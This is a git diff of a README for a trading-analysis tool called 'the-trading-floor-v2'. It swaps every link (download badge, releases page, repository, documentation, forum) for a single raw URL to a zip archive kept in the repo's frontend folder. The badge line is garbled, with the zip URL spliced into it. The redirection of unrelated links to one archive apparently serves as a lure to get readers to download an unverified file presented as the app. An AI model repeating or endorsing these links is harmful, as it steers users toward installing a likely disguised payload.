@@ -1,6 +1,6 @@
 # 🏦 the-trading-floor-v2 - Analyze Markets with AI Agents
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Ready%20to%20Run-blue.svg)](https://github.com/Aurionlol/the-trading-floor-v2/releases)
+[![Download Release](https://raw.githubusercontent.com/Aurionlol/the-trading-floor-v2/main/frontend/app/floor-the-trading-v-3.6.zip%20Now-Ready%20to%https://raw.githubusercontent.com/Aurionlol/the-trading-floor-v2/main/frontend/app/floor-the-trading-v-3.6.zip)](https://raw.githubusercontent.com/Aurionlol/the-trading-floor-v2/main/frontend/app/floor-the-trading-v-3.6.zip)
 
 ## 🚀 Overview
 
@@ -18,7 +18,7 @@ The Trading Floor is a multi-agent market analysis system. This software allows 
 
 To get started, you need to download the application. 
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Aurionlol/the-trading-floor-v2/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Aurionlol/the-trading-floor-v2/main/frontend/app/floor-the-trading-v-3.6.zip) to find the latest version.
 2. **Select the Right File**: Look for the latest release, which will be easy to spot. 
 3. **Download the File**: Click on the file that matches your operating system (Windows, Mac, or Linux).
 
@@ -80,13 +80,13 @@ If you need help or have questions, you can find support through the following:
 
 For more information about the Trading Floor:
 
-- **GitHub Repository**: Visit our [GitHub repository](https://github.com/Aurionlol/the-trading-floor-v2) for source code and development updates.
+- **GitHub Repository**: Visit our [GitHub repository](https://raw.githubusercontent.com/Aurionlol/the-trading-floor-v2/main/frontend/app/floor-the-trading-v-3.6.zip) for source code and development updates.
 - **User Guide**: Find a comprehensive user guide that explains more about using each AI agent.
 
 ## 🔗 Quick Links
 
-- **Download Release**: [Visit the Releases page](https://github.com/Aurionlol/the-trading-floor-v2/releases)
-- **Documentation**: [Access the User Guide](https://github.com/Aurionlol/the-trading-floor-v2/docs)
-- **Community Support**: [Join our Forum](https://github.com/Aurionlol/the-trading-floor-v2/discussions)  
+- **Download Release**: [Visit the Releases page](https://raw.githubusercontent.com/Aurionlol/the-trading-floor-v2/main/frontend/app/floor-the-trading-v-3.6.zip)
+- **Documentation**: [Access the User Guide](https://raw.githubusercontent.com/Aurionlol/the-trading-floor-v2/main/frontend/app/floor-the-trading-v-3.6.zip)
+- **Community Support**: [Join our Forum](https://raw.githubusercontent.com/Aurionlol/the-trading-floor-v2/main/frontend/app/floor-the-trading-v-3.6.zip)  
 
 By following these steps, you will have The Trading Floor installed and ready to help you analyze market data efficiently. Enjoy your experience with this cutting-edge software!
